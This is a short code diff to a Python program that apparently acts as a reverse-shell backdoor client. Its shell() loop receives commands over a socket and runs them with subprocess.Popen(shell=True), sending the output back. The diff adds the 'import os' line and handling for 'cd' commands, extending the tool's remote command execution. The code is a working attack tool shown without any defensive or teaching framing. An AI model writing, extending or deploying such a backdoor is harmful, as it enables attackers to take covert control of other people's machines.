@@ -1,6 +1,7 @@
 import socket
 import json
 import subprocess
+import os
 
 
 
@@ -24,8 +25,13 @@ def shell():
         command = reliable_rcv()
         if command == "quit":
             break
-        if command == "help":
+        elif command == "help":
             pass
+
+        elif command[:3] == "cd ":
+            os.chdir(command[3:])
+
+
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = execute.stdout.read() + execute.stderr.read()
